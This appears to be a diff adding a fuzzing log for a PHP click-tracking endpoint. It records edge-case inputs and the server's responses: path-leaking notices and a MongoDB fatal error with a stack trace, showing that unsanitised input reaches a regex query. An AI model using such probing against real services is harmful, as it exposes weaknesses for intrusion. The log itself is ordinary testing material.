@@ -1,0 +1,4194 @@
+array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "undefined"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "undef"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "null"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "NULL"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "(null)"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "nil"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "NIL"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "true"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "false"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "True"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "False"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "TRUE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "FALSE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "None"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(14) "hasOwnProperty"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "then"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(11) "constructor"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "%5C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "%5C%5C"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "1.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "$1.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+  [2]=>
+  string(1) "2"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "1E2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "1E02"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "1E+02"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "-1.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "-$1.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-1"
+  [2]=>
+  string(1) "2"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "-1E2"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "-1E02"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(6) "-1E+02"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+  [2]=>
+  string(1) "0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "0"
+  [2]=>
+  string(1) "0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(11) "-2147483648"
+  [2]=>
+  string(2) "-1"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(20) "-9223372036854775808"
+  [2]=>
+  string(2) "-1"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "-0.0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "+0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "+0.0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "0.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "0..0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "."
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "0.0.0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "0,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(4) "0,,0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) ","
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "0,0,0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "0.0"
+  [2]=>
+  string(1) "0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "1.0"
+  [2]=>
+  string(3) "0.0"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "0.0"
+  [2]=>
+  string(3) "0.0"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "1,0"
+  [2]=>
+  string(3) "0,0"
+}
+No record found=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "0,0"
+  [2]=>
+  string(3) "0,0"
+}
+No record found=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "--1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "-"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-."
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-,"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(96) "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "NaN"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "Infinity"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "-Infinity"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "INF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "-1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(1) "1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(3) "0x0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "0xffffffff"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(18) "0xffffffffffffffff"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "0xabad1dea"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(39) "123456789012345678901234567890123456789"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "1,000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "1%20000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "1'000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) "1,000,000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "1%20000%20000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) "1'000'000.00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "1.000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(10) "1%20000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(8) "1'000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) "1.000.000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(16) "1%20000%20000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(12) "1'000'000,00"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(5) "01000"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "08"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "09"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(23) "2.2250738585072011e-308"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(3) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) ",."
+  [2]=>
+  string(9) ";'[]%5C-="
+}
+<br />
+<b>Fatal error</b>:  Uncaught MongoDB\Driver\Exception\CommandException: Regular expression is invalid: range out of order in character class in /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php:299
+Stack trace:
+#0 /var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php(299): MongoDB\Driver\Server-&gt;executeQuery('sendplex.sms_hi...', Object(MongoDB\Driver\Query), Array)
+#1 /var/www/html/vendor/mongodb/mongodb/src/Operation/FindOne.php(126): MongoDB\Operation\Find-&gt;execute(Object(MongoDB\Driver\Server))
+#2 /var/www/html/vendor/mongodb/mongodb/src/Collection.php(657): MongoDB\Operation\FindOne-&gt;execute(Object(MongoDB\Driver\Server))
+#3 /var/www/html/click.php(48): MongoDB\Collection-&gt;findOne(Array)
+#4 {main}
+  thrown in <b>/var/www/html/vendor/mongodb/mongodb/src/Operation/Find.php</b> on line <b>299</b><br />
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(22) "%3C%3E?:%22%7B%7D%7C_+"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(2) "!@"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(81) "%01%02%03%04%05%06%07%08%0E%0F%10%11%12%13%14%15%16%17%18%19%1A%1B%1C%1D%1E%1F%7F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(186) "%C2%80%C2%81%C2%82%C2%83%C2%84%C2%86%C2%87%C2%88%C2%89%C2%8A%C2%8B%C2%8C%C2%8D%C2%8E%C2%8F%C2%90%C2%91%C2%92%C2%93%C2%94%C2%95%C2%96%C2%97%C2%98%C2%99%C2%9A%C2%9B%C2%9C%C2%9D%C2%9E%C2%9F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(186) "%09%0B%0C%20%C2%85%C2%A0%E1%9A%80%E2%80%82%E2%80%83%E2%80%82%E2%80%83%E2%80%84%E2%80%85%E2%80%86%E2%80%87%E2%80%88%E2%80%89%E2%80%8A%E2%80%8B%E2%80%A8%E2%80%A9%E2%80%AF%E2%81%9F%E3%80%80"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access /Â­ØØØØØØØÛÜá ââââââªâ«â¬â­â®â â¡â¢â£â¤â¦â§â¨â©âªâ«â¬â­â®â¯ï»¿ï¿¹ï¿ºï¿»ð½ð² ð²¡ð²¢ð²£ð³ð´ðµð¶ð·ð¸ð¹ðºó ó  ó ¡ó ¢ó £ó ¤ó ¥ó ¦ó §ó ¨ó ©ó ªó «ó ¬ó ­ó ®ó ¯ó °ó ±ó ²ó ³ó ´ó µó ¶ó ·ó ¸ó ¹ó ºó »ó ¼ó ½ó ¾ó ¿ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó ó  ó ¡ó ¢ó £ó ¤ó ¥ó ¦ó §ó ¨ó ©ó ªó «ó ¬ó ­ó ®ó ¯ó °ó ±ó ²ó ³ó ´ó µó ¶ó ·ó ¸ó ¹ó ºó »ó ¼ó ½ó ¾ó ¿
+on this server.</p>
+</body></html>
+=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%EF%BB%BF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(9) "%EF%BF%BE"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(75) "%CE%A9%E2%89%88%C3%A7%E2%88%9A%E2%88%AB%CB%9C%C2%B5%E2%89%A4%E2%89%A5%C3%B7"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(75) "%C3%A5%C3%9F%E2%88%82%C6%92%C2%A9%CB%99%E2%88%86%CB%9A%C2%AC%E2%80%A6%C3%A6"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(84) "%C5%93%E2%88%91%C2%B4%C2%AE%E2%80%A0%C2%A5%C2%A8%CB%86%C3%B8%CF%80%E2%80%9C%E2%80%98"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(87) "%C2%A1%E2%84%A2%C2%A3%C2%A2%E2%88%9E%C2%A7%C2%B6%E2%80%A2%C2%AA%C2%BA%E2%80%93%E2%89%A0"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(63) "%C2%B8%CB%9B%C3%87%E2%97%8A%C4%B1%CB%9C%C3%82%C2%AF%CB%98%C2%BF"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(78) "%C3%85%C3%8D%C3%8E%C3%8F%CB%9D%C3%93%C3%94%EF%A3%BF%C3%92%C3%9A%C3%86%E2%98%83"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(87) "%C5%92%E2%80%9E%C2%B4%E2%80%B0%CB%87%C3%81%C2%A8%CB%86%C3%98%E2%88%8F%E2%80%9D%E2%80%99"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(102) "%60%E2%81%84%E2%82%AC%E2%80%B9%E2%80%BA%EF%AC%81%EF%AC%82%E2%80%A1%C2%B0%C2%B7%E2%80%9A%E2%80%94%C2%B1"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(36) "%E2%85%9B%E2%85%9C%E2%85%9D%E2%85%9E"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(474) "%D0%81%D0%82%D0%83%D0%84%D0%85%D0%86%D0%87%D0%88%D0%89%D0%8A%D0%8B%D0%8C%D0%8D%D0%8E%D0%8F%D0%90%D0%91%D0%92%D0%93%D0%94%D0%95%D0%96%D0%97%D0%98%D0%99%D0%9A%D0%9B%D0%9C%D0%9D%D0%9E%D0%9F%D0%A0%D0%A1%D0%A2%D0%A3%D0%A4%D0%A5%D0%A6%D0%A7%D0%A8%D0%A9%D0%AA%D0%AB%D0%AC%D0%AD%D0%AE%D0%AF%D0%B0%D0%B1%D0%B2%D0%B3%D0%B4%D0%B5%D0%B6%D0%B7%D0%B8%D0%B9%D0%BA%D0%BB%D0%BC%D0%BD%D0%BE%D0%BF%D1%80%D1%81%D1%82%D1%83%D1%84%D1%85%D1%86%D1%87%D1%88%D1%89%D1%8A%D1%8B%D1%8C%D1%8D%D1%8E%D1%8F"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(60) "%D9%A0%D9%A1%D9%A2%D9%A3%D9%A4%D9%A5%D9%A6%D9%A7%D9%A8%D9%A9"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%E2%81%B0%E2%81%B4%E2%81%B5"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(27) "%E2%82%80%E2%82%81%E2%82%82"
+}
+<br />
+<b>Notice</b>:  Undefined offset: 2 in <b>/var/www/html/click.php</b> on line <b>14</b><br />
+Unknown tracking=============================array(2) {
+  [0]=>
+  string(0) ""
+  [1]=>
+  string(54) "%E2%81%B0%E2%81%B4%E2%81%B5%E2%82%80%E2%82%81%E2%82%82"
+}
+<br />
